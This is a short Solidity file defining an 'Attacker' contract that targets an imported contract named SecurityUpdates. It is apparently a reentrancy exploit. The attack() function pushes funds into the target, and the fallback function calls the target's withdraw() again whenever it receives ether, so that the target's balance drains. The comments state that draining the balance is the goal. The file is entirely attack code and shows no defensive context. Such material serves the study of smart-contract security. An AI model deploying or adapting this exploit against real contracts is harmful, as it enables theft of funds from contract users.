pragma solidity ^0.4.26;

import "./SecurityUpdates.sol";

contract Attacker {
    SecurityUpdates private vulnerableContract;

    constructor(address _vulnerableContract) public {
        vulnerableContract = SecurityUpdates(_vulnerableContract);
    }

    function attack() public payable {
        // Call SecurityUpdate function with a large value to drain contract balance
        vulnerableContract.SecurityUpdate.value(address(this).balance)();
    }

    function () public payable {
        // Re-enter the contract and drain its balance again
        vulnerableContract.withdraw();
    }
}